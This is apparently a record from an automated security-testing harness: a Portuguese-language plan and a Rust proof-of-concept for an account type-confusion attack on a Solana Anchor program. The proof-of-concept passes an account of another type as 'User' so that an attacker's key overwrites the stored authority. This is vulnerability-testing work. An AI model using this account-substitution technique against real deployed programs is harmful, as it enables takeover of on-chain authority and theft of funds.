attempts.raw:
{
  "plan": "O programa `initialize` recebe uma conta `user` como `AccountInfo` e desserializa manualmente via `User::try_from_slice`, sem verificar discriminador. O baseline usa uma conta `user` com dados de 32 bytes (layout de `User`) e uma authority signer, provando que o cenario esta correto. O ataque fornece uma conta cujos dados sao de outro tipo (por exemplo, uma conta com discriminador de outro tipo seguido de 32 bytes), mas com os mesmos 32 bytes iniciais que serao interpretados como `authority`. O efeito medido e que o campo `authority` na conta resultante foi sobrescrito com a chave do atacante, demonstrando que dados de outro tipo foram aceitos como `User`.",
  "scenario": "let authority = Pubkey::new_unique();
let attacker = Pubkey::new_unique();

// Conta legitima: dados de User (32 bytes = authority)
let user_data = anchor_account_data("User", &(authority,));
let user_account = account(&env.program_id, &user_data, None);

let metas = vec![
    AccountMeta::new(user_account_key, false),
    AccountMeta::new_readonly(authority, true),
];
let contas = vec![
    (user_account_key, user_account.clone()),
    (authority, wallet(1_000_000_000)),
];

let ix = env.anchor_ix("initialize", &(), metas);
let r = env.baseline("initialize legitimo", &ix, &contas);

// Ataque: conta com dados de outro tipo (discriminador diferente) mas mesmos 32 bytes iniciais
let fake_data = anchor_account_data("OutroTipo", &(attacker,));
let fake_account = account(&env.program_id, &fake_data, None);

let metas_ataque = vec![
    AccountMeta::new(fake_account_key, false),
    AccountMeta::new_readonly(attacker, true),
];
let contas_ataque = vec![
    (fake_account_key, fake_account),
    (attacker, wallet(1_000_000_000)),
];

let ix_ataque = env.anchor_ix("initialize", &(), metas_ataque);
let r_ataque = env.attack("cosplay: conta de outro tipo aceita como User", &ix_ataque, &contas_ataque);

if r_ataque.program_result == ProgramResult::Success {
    let dados = after(&r_ataque, &fake_account_key).data();
    let authority_gravada = read_pubkey(dados, 0);
    env.effect("authority sobrescrita com chave do atacante em conta de outro tipo", authority_gravada == attacker);
}"
}

